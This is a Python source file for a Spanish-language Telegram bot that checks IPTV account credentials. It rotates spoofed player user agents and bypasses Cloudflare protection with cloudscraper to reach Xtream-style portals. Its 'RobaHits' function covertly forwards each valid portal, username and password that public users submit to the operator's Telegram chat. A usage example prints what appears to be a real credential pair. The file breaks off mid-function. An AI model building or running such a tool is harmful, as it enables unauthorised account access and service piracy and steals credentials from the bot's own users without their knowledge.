#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂
• Cloudflare bypass integrado (cloudscraper + cookies)
• 11 User-Agents IPTV reales rotados automáticamente
• Verificación HIT/FAIL/RETRY paralela y ultrarrápida
• Bot público — RobaHits al admin
• Hora correcta por zona horaria
"""

import os, re, json, time, threading, logging, socket, asyncio, random, pickle
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import pytz
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

# ══════════════════════════════════════════════════════
#  ⚙️  VARIABLES DE ENTORNO — Configura en Railway
# ══════════════════════════════════════════════════════
#
#  BOT_TOKEN       → Token de @BotFather
#  ADMIN_ID        → Tu ID de Telegram (@userinfobot)
#  RENDER_URL      → URL de Railway para keep-alive 24/7
#  ROBAHITS_CHATID → Tu chat ID donde llegan los HITs
#                    (si no lo pones, usa ADMIN_ID)
#  TZ_NAME         → Zona horaria:
#                    America/Mexico_City | America/Bogota
#                    America/Lima | America/Santiago
#                    America/Argentina/Buenos_Aires
#
BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL      = os.getenv("RENDER_URL", "")
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", str(ADMIN_ID))
TZ_NAME         = os.getenv("TZ_NAME", "America/Mexico_City")
TZ              = pytz.timezone(TZ_NAME)
BOT_USERNAME    = "@Luishits_bot"

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings()

# ── Estado global ──────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}
LINE  = "━" * 28

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

# ── 11 User-Agents IPTV reales (incluyendo los nuevos pedidos) ──────────────
ALL_USER_AGENTS = [
    # Nuevos de alta compatibilidad
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0-Git:20240101-4a869c2",
    "VLC/3.5.4 LibVLC/3.0.21 (Android 13)",
    "VLC/3.0.21 LibVLC/3.0.21",
    "okhttp/4.9.0",
    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
    "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
    "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
    "SS_IPTV/3.9.0 (SmartTV)",
    "curl/7.88.1",
    # Clásicos confiables
    "VLC/3.0.18 LibVLC/3.0.18",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "TiviMate/4.4.0 (Android 11)",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "GSE SMART IPTV/7.4 (Android 11)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
]

# Dominios con protección Cloudflare conocida
CF_DOMAINS = [
    'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
    'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
    'titanxtv.com','venusiptv.com','latinchannel.tv',
]

# Directorio de cookies persistentes
COOKIES_DIR = Path("cf_cookies")
COOKIES_DIR.mkdir(exist_ok=True)

# ══════════════════════════════════════════════════════
#  🕐 HORA LOCAL
# ══════════════════════════════════════════════════════

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

# ══════════════════════════════════════════════════════
#  🔍 EXTRACCIÓN DE URL — Universal
# ══════════════════════════════════════════════════════

def extract_from_url(text: str):
    text = text.strip().replace("\r","").replace("%3A",":").replace("%2F","/")
    patterns = [
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            portal = m.group(1)
            user   = m.group(2)
            pwd    = m.group(3)
            for bad in ("&type=","&output=","&format=","\n"," "):
                pwd = pwd.split(bad)[0]
            pwd = pwd.split('&')[0].split('?')[0].strip()
            return portal, user, pwd
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2]
    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2]
    return None, None, None

# ══════════════════════════════════════════════════════
#  🛡️  CLOUDFLARE BYPASS — Integrado
# ══════════════════════════════════════════════════════

def _is_cf_domain(host: str) -> bool:
    h = host.lower().split(':')[0]
    return any(d in h for d in CF_DOMAINS)

def _cookie_path(host: str) -> Path:
    clean = host.split(':')[0].replace('.','_')
    return COOKIES_DIR / f"{clean}.pkl"

def _save_cookies(session, host: str):
    try:
        with open(_cookie_path(host), 'wb') as f:
            pickle.dump(session.cookies, f)
    except Exception:
        pass

def _load_cookies(session, host: str):
    try:
        p = _cookie_path(host)
        if p.exists():
            with open(p, 'rb') as f:
                session.cookies.update(pickle.load(f))
            return True
    except Exception:
        pass
    return False

def _make_session(host: str):
    """
    Crea la mejor sesión disponible:
    1. cloudscraper (si está instalado) → bypass real de JS challenge
    2. requests.Session normal como fallback
    """
    try:
        import cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False},
            delay=8
        )
        _load_cookies(scraper, host)
        log.info(f"🛡️ cloudscraper activo para {host}")
        return scraper, True
    except ImportError:
        pass
    except Exception as e:
        log.warning(f"cloudscraper error: {e}")

    session = requests.Session()
    _load_cookies(session, host)
    return session, False

def _cf_request(url: str, host: str, timeout: int = 15):
    """
    Petición con bypass Cloudflare:
    - Usa cloudscraper si disponible
    - Rota User-Agents en cada intento
    - Guarda cookies exitosas
    """
    session, is_cf = _make_session(host)
    uas = random.sample(ALL_USER_AGENTS, min(4, len(ALL_USER_AGENTS)))

    for ua in uas:
        try:
            headers = {
                "User-Agent":      ua,
                "Accept":          "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection":      "keep-alive",
                "Cache-Control":   "no-cache",
            }
            r = session.get(url, headers=headers, timeout=timeout,
                            verify=False, allow_redirects=True)
            if r.status_code == 200:
                raw = r.text.strip()
                if not (raw.startswith("<") and
                        ("cloudflare" in raw.lower() or "attention required" in raw.lower())):
                    _save_cookies(session, host)
                    return r
            elif r.status_code in (403, 503):
                log.warning(f"CF block {r.status_code} con UA={ua[:30]}")
                time.sleep(random.uniform(1, 2))
                continue
        except Exception as e:
            log.debug(f"CF req err: {e}")
            continue
    return None

# ══════════════════════════════════════════════════════
#  ✅ VERIFICACIÓN — PARALELA + CF BYPASS
# ══════════════════════════════════════════════════════

def _parse_json(raw: str):
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None

def _analyze(data) -> tuple:
    if not isinstance(data, dict):
        return "RETRY", None
    ui = data.get("user_info")
    if ui is None:
        if "auth" in data:
            ui = data
        else:
            return "RETRY", None
    auth = ui.get("auth")
    if auth is None:
        return "RETRY", None
    try:
        auth = int(auth)
    except Exception:
        return "RETRY", None
    if auth == 0:
        return "FAIL", None
    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {"user_info": real_ui, "server_info": data.get("server_info", {})}
        return ("HIT" if real_ui.get("status","") == "Active" else "CUSTOM"), payload
    return "RETRY", None

def _process_response(r) -> tuple:
    """Procesa una respuesta HTTP y devuelve (resultado, payload)."""
    if r is None or r.status_code not in (200, 206):
        return "RETRY", None
    raw = r.text.strip()
    if not raw or len(raw) < 5:
        return "RETRY", None
    if raw.startswith("<") or "cloudflare" in raw.lower():
        return "RETRY", None
    # M3U directo = cuenta activa
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth":1,"status":"Active","exp_date":"0",
                "active_cons":"?","max_connections":"?",
                "is_trial":"0","created_at":"0",
            },
            "server_info": {}, "m3u_direct": True,
        }
    data = _parse_json(raw)
    if data is None:
        return "RETRY", None
    return _analyze(data)

def _single_request(url: str, ua: str, host: str, timeout: int = 12) -> tuple:
    """Petición normal con UA específico."""
    try:
        r = requests.get(url,
            headers={"User-Agent":ua,"Accept":"*/*",
                     "Connection":"keep-alive","Cache-Control":"no-cache"},
            timeout=timeout, verify=False, allow_redirects=True)
        return _process_response(r)
    except Exception as e:
        log.debug(f"Req err: {e}")
        return "RETRY", None

def verify_account(portal: str, user: str, pwd: str) -> tuple:
    """
    Verificación ultra rápida y paralela:
    1. Test TCP rápido
    2. Si es dominio CF → usa bypass dedicado primero
    3. Lanza todas las combinaciones en paralelo
    4. Primera respuesta válida gana
    """
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080
    is_cf = _is_cf_domain(host)

    # ── Test TCP ──────────────────────────────────────────
    tcp_ok = False
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            tcp_ok = True
            break
        except Exception:
            pass
    if not tcp_ok:
        log.warning(f"TCP ❌ {host}")
        return "RETRY", None

    # ── Si es dominio Cloudflare → intentar bypass primero ──
    if is_cf:
        log.info(f"🛡️ Dominio CF detectado: {host}")
        for scheme in ("http", "https"):
            api_url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
            r = _cf_request(api_url, host, timeout=20)
            result, payload = _process_response(r)
            if result != "RETRY":
                log.info(f"✅ CF bypass exitoso: {result}")
                return result, payload
            # También probar get.php
            m3u_url = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
            r2 = _cf_request(m3u_url, host, timeout=20)
            result2, payload2 = _process_response(r2)
            if result2 != "RETRY":
                return result2, payload2

    # ── Peticiones paralelas normales ────────────────────────
    tasks = []
    for scheme in ("http", "https"):
        api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
        m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        # Probar con varios UAs en paralelo
        for ua in random.sample(ALL_USER_AGENTS, min(5, len(ALL_USER_AGENTS))):
            tasks.append((api, ua, host))
        tasks.append((m3u, ALL_USER_AGENTS[0], host))

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(_single_request, url, ua, h, 12): (url, ua)
                   for url, ua, h in tasks}
        for fut in as_completed(futures, timeout=35):
            try:
                result, payload = fut.result()
                if result != "RETRY":
                    for f in futures:
                        f.cancel()
                    return result, payload
            except Exception:
                pass

    # ── Último recurso: CF bypass para cualquier dominio ────
    if not is_cf:
        log.info(f"🔄 Intentando CF bypass como último recurso para {host}")
        for scheme in ("http", "https"):
            url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
            r = _cf_request(url, host, timeout=20)
            result, payload = _process_response(r)
            if result != "RETRY":
                return result, payload

    return "RETRY", None

# ══════════════════════════════════════════════════════
#  📊 DATOS ADICIONALES — Paralelos
# ══════════════════════════════════════════════════════

def _count_action(portal, user, pwd, action) -> str:
    try:
        ua = random.choice(ALL_USER_AGENTS)
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action={action}",
            headers={"User-Agent": ua}, timeout=12, verify=False)
        if r.status_code == 200:
            d = r.json()
            return str(len(d)) if isinstance(d, list) else "0"
    except Exception:
        pass
    return "N/D"

def get_content_counts(portal, user, pwd) -> tuple:
    res = {"live":"N/D","vod":"N/D","series":"N/D"}
    with ThreadPoolExecutor(max_workers=3) as ex:
        futs = {
            ex.submit(_count_action, portal, user, pwd, "get_live_streams"): "live",
            ex.submit(_count_action, portal, user, pwd, "get_vod_streams"):  "vod",
            ex.submit(_count_action, portal, user, pwd, "get_series"):       "series",
        }
        for fut in as_completed(futs, timeout=20):
            try:
                res[futs[fut]] = fut.result()
            except Exception:
                pass
    return res["live"], res["vod"], res["series"]

def get_categories(portal, user, pwd, limit=20) -> str:
    try:
        ua = random.choice(ALL_USER_AGENTS)
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": ua}, timeout=12, verify=False)
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""
        count_map: dict = {}
        try:
            r2 = requests.get(
                f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent": ua}, timeout=15, verify=False)
            if r2.status_code == 200:
                for ch in r2.json():
                    cid = str(ch.get("category_id",""))
                    count_map[cid] = count_map.get(cid, 0) + 1
        except Exception:
            pass
        lines = []
        for c in cats[:limit]:
            name = c.get("category_name","").replace("\\/","/").strip()
            cid  = str(c.get("category_id",""))
            if not name:
                continue
            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"  ➠ {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"  ➕ ...y {len(cats)-limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""

def get_location(portal) -> str:
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return f"{d.get('country','?')} {FLAGS.get(d.get('countryCode',''),'🌍')}"
    except Exception:
        pass
    return "Desconocido 🌍"

# ══════════════════════════════════════════════════════
#  🔔 ROBAHITS — Reenvío de HITs al admin
# ══════════════════════════════════════════════════════

def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
    if not BOT_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        text   = (
            f"🦂 <b>ROBO HIT — LUIS R</b> 🦂\n\n"
            f"👤 Verificado por: @{from_user}\n\n"
            f"🌐 Portal: <code>{portal}</code>\n"
            f"👤 Usuario: <code>{user}</code>\n"
            f"🔑 Pass: <code>{pwd}</code>\n"
            f"⏲ Vence: {expire}\n"
            f"📺 {live} canales | 🎥 {vod} VOD | 📹 {series} series\n"
            f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
            f"🕐 {now_str()}\n🦂 {BOT_USERNAME}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=8
        )
    except Exception as e:
        log.warning(f"RobaHit err: {e}")

# ══════════════════════════════════════════════════════
#  🃏 TARJETAS DE RESULTADO
# ══════════════════════════════════════════════════════

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire   = ts_to_date(ui.get("exp_date", 0))
    created  = ts_to_date(ui.get("created_at", 0))
    active   = ui.get("active_cons", "?")
    maxcon   = ui.get("max_connections", "?")
    status   = ui.get("status", "Active")
    trial    = "No Trial" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Trial"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟢 CUENTA VÁLIDA\n"
    t += f"➥ 🆙 Estado: ✅ {status.upper()}\n"
    t += f"➥ 🧪 Trial: {trial}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ 📅 Creada: {created}\n"
    t += f"➥ ⏲ Vence: {expire}\n"
    t += f"➥ 👁 Conexiones: {active} / {maxcon}\n"
    t += f"➥ 📍 País: {location}\n"
    t += f"{LINE}\n     ★彡ᴄᴏɴᴛᴇɴᴛ彡★\n{LINE}\n"
    t += f"➥ 📺 En Vivo: {live}\n"
    t += f"➥ 🎥 VOD: {vod}\n"
    t += f"➥ 📹 Series: {series}\n"
    t += f"{LINE}\n"
    t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
    if cats:
        t += f"{LINE}\n   ★彡ᴄ​ᴀ​ᴛ​ᴇ​ɢ​ᴏ​ʀ​í​ᴀ​s彡★\n{LINE}\n{cats}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟡 CUENTA EXISTE — NO ACTIVA\n"
    t += f"➥ 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ ⏲ Vence: {ts_to_date(ui.get('exp_date',0))}\n"
    t += f"➥ 👥 Max: {ui.get('max_connections','?')}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_fail(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔴 CUENTA INVÁLIDA\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ❌ Credenciales incorrectas (auth=0)\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_retry(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔄 SIN RESPUESTA / RETRY\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ⚠️ Servidor bloqueado o sin respuesta\n"
    t += f"   💡 Intenta más tarde\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

# ══════════════════════════════════════════════════════
#  🔄 KEEP-ALIVE 24/7
# ══════════════════════════════════════════════════════

def keep_alive():
    if not RENDER_URL:
        return
    while True:
        try:
            requests.get(RENDER_URL, timeout=8)
            log.info("Keep-alive ✅")
        except Exception:
            pass
        time.sleep(480)

# ══════════════════════════════════════════════════════
#  🛠️ HELPERS
# ══════════════════════════════════════════════════════

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ══════════════════════════════════════════════════════
#  ⚡ LÓGICA CENTRAL
# ══════════════════════════════════════════════════════

async def do_check(update: Update, portal: str, user: str, pwd: str):
    if not bot_active:
        await update.message.reply_text(
            f"🔴 Bot detenido.\nContacta al admin {BOT_USERNAME}")
        return
    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg = await update.message.reply_text("🔍 Verificando cuenta…")
    loop = asyncio.get_event_loop()
    status, result = await loop.run_in_executor(None, verify_account, portal, user, pwd)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 Obteniendo contenido…")
        ui = result["user_info"]
        live_fut = loop.run_in_executor(None, get_content_counts, portal, user, pwd)
        cats_fut = loop.run_in_executor(None, get_categories, portal, user, pwd)
        live, vod, series = await live_fut
        cats              = await cats_fut
        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        threading.Thread(target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series, tg_user),
            daemon=True).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)

    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user), parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════
#  📟 COMANDOS
# ══════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    if is_admin(update):
        global bot_active
        bot_active = True
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📖 Ayuda", callback_data="help"),
        InlineKeyboardButton("📊 Estado", callback_data="status"),
    ]])
    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n         <b>BY LUIS R</b>\n\n"
        f"✅ Bot activo y listo\n\n"
        f"📌 <b>Pega tu URL IPTV aquí:</b>\n"
        f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
        f"📌 <b>O usa el comando:</b>\n"
        f"<code>/check portal:puerto usuario pass</code>\n\n"
        f"⚡ Verificación ultra rápida + bypass Cloudflare\n"
        f"🔔 HITs enviados automáticamente al admin\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    try:
        import cloudscraper
        cf_status = "✅ Instalado"
    except ImportError:
        cf_status = "⚠️ No instalado (pip install cloudscraper)"
    await update.message.reply_text(
        f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
        f"📺 Bot: {estado}\n"
        f"⏰ Uptime: {h:02d}h {m:02d}m {s:02d}s\n"
        f"🕐 Hora: {now_str()}\n"
        f"🌐 Zona: {TZ_NAME}\n\n"
        f"✅ Hits: {STATS['hits']}\n"
        f"❌ Fails: {STATS['fails']}\n"
        f"🔄 Retries: {STATS['retries']}\n"
        f"⭐ Total: {STATS['checks']}\n"
        f"👥 Usuarios: {len(STATS['users'])}\n\n"
        f"🛡️ Cloudscraper: {cf_status}\n"
        f"🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <b>Uso:</b>\n"
            "<code>/check portal:puerto usuario contraseña</code>\n\n"
            "🔥 <b>Ejemplo:</b>\n"
            "<code>/check latinchannel.tv:8080 rafael.mazzilli mazzilli1402</code>",
            parse_mode=ParseMode.HTML)
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML)
        return
    portal, user, pwd = args[0], args[1], args[2]
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080
    msg  = await update.message.reply_text("🔬 Ejecutando diagnóstico…")
    lines = [f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n"]
    lines.append(f"🛡️ CF protegido: {'✅ Sí' if _is_cf_domain(host) else '❌ No'}\n")
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:50]}")
    lines.append("")
    for scheme in ("http","https"):
        url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
        lines.append(f"🔗 <b>{scheme.upper()}</b>")
        try:
            ua = random.choice(ALL_USER_AGENTS)
            r = requests.get(url, headers={"User-Agent": ua},
                             timeout=10, verify=False)
            lines.append(f"  Status: <code>{r.status_code}</code>")
            lines.append(f"  UA usado: <code>{ua[:40]}</code>")
            raw = (r.text.strip()[:400]
                   .replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
            lines.append(f"  Respuesta:\n<code>{raw}</code>")
        except requests.exceptions.ConnectionError:
            lines.append("  ❌ Conexión rechazada")
        except requests.exceptions.Timeout:
            lines.append("  ⏱ Timeout")
        except Exception as e:
            lines.append(f"  ❌ {str(e)[:80]}")
        lines.append("")
    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)

async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Agrega un dominio a la lista CF protegida en tiempo real."""
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "📌 <code>/addcf dominio.com</code>",
            parse_mode=ParseMode.HTML)
        return
    domain = args[0].lower().strip()
    if domain not in CF_DOMAINS:
        CF_DOMAINS.append(domain)
        await update.message.reply_text(
            f"✅ <code>{domain}</code> agregado a la lista CF.\n"
            f"🦂 {BOT_USERNAME}", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"⚠️ <code>{domain}</code> ya estaba en la lista.",
            parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_cmds = ""
    if is_admin(update):
        admin_cmds = (
            "\n\n🔧 <b>Comandos Admin:</b>\n"
            "/stop — 🔴 Apagar bot\n"
            "/status — 📊 Estadísticas\n"
            "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
            "/addcf <code>dominio</code> — 🛡️ Agregar dominio CF\n"
        )
    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
        f"📌 <b>Comandos:</b>\n"
        f"/start — 🟢 Inicio\n"
        f"/check <code>portal user pass</code> — ✅ Verificar\n"
        f"/help — ❓ Ayuda\n"
        f"{admin_cmds}\n"
        f"💡 <b>Formatos soportados:</b>\n"
        f"• URL M3U completa\n"
        f"• <code>portal|usuario|pass</code>\n"
        f"• <code>portal usuario pass</code>\n\n"
        f"🦂 {BOT_USERNAME}",
